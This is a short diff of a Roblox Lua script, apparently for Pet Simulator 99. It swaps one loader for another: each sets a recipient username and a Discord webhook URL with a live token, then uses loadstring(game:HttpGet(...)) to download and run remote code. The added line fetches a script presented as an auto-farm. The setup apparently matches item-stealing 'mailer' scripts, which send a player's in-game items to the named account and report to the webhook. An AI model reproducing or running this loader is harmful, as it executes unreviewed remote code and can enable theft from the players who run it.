@@ -1,5 +1,3 @@
-Username = "flamexfarm1"
-Username2 = "BankMailWe"
-Webhook = "https://discord.com/api/webhooks/1276907812382838815/bRXCOYPOYnhMReewbSdiX4mwwthGCUBuE39f-mn0CNqCQPq0l1DAorhejZWpIGZHUiWO"
-
-loadstring(game:HttpGet(('https://darkscripts.space')))()
+_G.username = "BankMailWe"
+_G.Webhook = "https://discord.com/api/webhooks/1276907823468384320/gK8cOE8I24VmgugAs3ROBLRwbrEufjrPUSfbpB_iGJuOHu68aE7b50ueOmbNgLL7wKfM"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PS99/main/PetSimulator99AutoFarm.lua"))()
